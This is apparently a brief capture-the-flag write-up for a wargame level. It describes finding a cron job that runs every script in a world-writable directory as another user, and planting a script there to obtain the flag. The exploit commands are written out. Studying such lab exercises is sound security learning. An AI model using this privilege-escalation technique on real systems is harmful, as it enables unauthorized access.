`find / -user flag05 -or -iname flag05 -or -iname level05 2>/dev/null` gives us `/usr/sbin/openarenaserver` :
```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```
and a mail `/var/spool/mail/level05` :
`*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`
which mean the script must be run every 2min.
lucky for us the permission on /opt/openarenaserver is 775, which mean every user can write and modify it.
`echo 'getflag > /tmp/flag' > /opt/openarenaserver/flag.sh && chmod +x /opt/openarenaserver/flag.sh`
and 2min later we got the flag in /tmp/flag.
